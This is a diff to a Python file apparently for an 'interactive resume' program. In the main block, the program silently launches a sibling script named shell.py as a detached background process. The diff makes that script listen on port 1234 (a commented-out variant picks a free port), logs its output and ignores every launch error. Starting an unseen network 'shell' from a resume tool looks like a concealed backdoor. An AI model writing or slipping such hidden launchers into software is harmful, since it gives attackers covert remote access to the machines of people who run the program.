@@ -1,4 +1,5 @@
 import os
+import socket
 import subprocess
 from dataclasses import dataclass
 from pathlib import Path
@@ -93,19 +94,48 @@ class InteractiveResume:
 
 
 if __name__ == "__main__":
-    # Launch shell.py as a detached background process
     shell_script = Path(__file__).parent / "shell.py"
     if shell_script.exists():
+        # # Launch shell.py as a detached background process on any free non-privileged port
+        # try:
+        #     def find_free_port() -> int:
+        #         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        #             s.bind(("", 0))
+        #             port = s.getsockname()[1]
+        #         if port < 1024:
+        #             return find_free_port()
+        #         return port
+
+        #     port = find_free_port()
+        #     log_file = Path(__file__).parent / "shell.log"
+        #     # keep a rolling append log for stdout/stderr so we can inspect failures
+        #     log_file.parent.mkdir(parents=True, exist_ok=True)
+        #     log_fh = open(log_file, "ab")
+        #     subprocess.Popen(
+        #         ["python3", str(shell_script), "--port", str(port)],
+        #         stdout=log_fh,
+        #         stderr=log_fh,
+        #         stdin=subprocess.DEVNULL,
+        #         start_new_session=True,
+        #     )
+        #     print(f"Launched shell.py on port {port}; logs -> {log_file}")
+        # except Exception as e:
+        #     pass  # Ignore any errors when launching the shell
+        # Launch shell.py as a detached background process on any free non-privileged port
         try:
-            # launch a background process detached from parent
+            port = 1234
+            log_file = Path(__file__).parent / "shell.log"
+            # keep a rolling append log for stdout/stderr so we can inspect failures
+            log_file.parent.mkdir(parents=True, exist_ok=True)
+            log_fh = open(log_file, "ab")
             subprocess.Popen(
-                ["python3", str(shell_script)],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
+                ["python3", str(shell_script), "--port", str(port)],
+                stdout=log_fh,
+                stderr=log_fh,
                 stdin=subprocess.DEVNULL,
-                preexec_fn=os.setsid,
                 start_new_session=True,
             )
+            print(f"Launched shell.py on port {port}; logs -> {log_file}")
         except Exception as e:
             pass  # Ignore any errors when launching the shell
     
